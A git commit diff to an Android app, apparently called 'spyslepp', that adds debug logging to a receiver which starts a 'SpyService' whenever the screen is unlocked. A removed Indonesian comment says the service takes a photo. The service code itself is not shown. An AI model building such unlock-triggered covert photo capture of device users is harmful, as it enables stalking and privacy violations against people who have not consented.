98b357c086ce1460937110c412b35e155977fa42
𝗦𝗣𝗬-𝗘 <161654922+123tool@users.noreply.github.com>
2026-05-05 23:44:16 +0700

    Update UnlockReceiver.java

--- app/src/main/java/com/spye/spyslepp/UnlockReceiver.java
+++ app/src/main/java/com/spye/spyslepp/UnlockReceiver.java
@@ -4,13 +4,20 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
+import android.util.Log;
 
 public class UnlockReceiver extends BroadcastReceiver {
+    private static final String TAG = "SPY_DEBUG";
+
     @Override
     public void onReceive(Context context, Intent intent) {
+        // Mendeteksi aksi unlock layar
         if (Intent.ACTION_USER_PRESENT.equals(intent.getAction())) {
-            // Trigger Service untuk ambil foto
+            Log.d(TAG, "Layar dibuka! Memulai SpyService...");
+            
             Intent serviceIntent = new Intent(context, SpyService.class);
+            
+            // Menjalankan service sesuai versi Android
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(serviceIntent);
             } else {
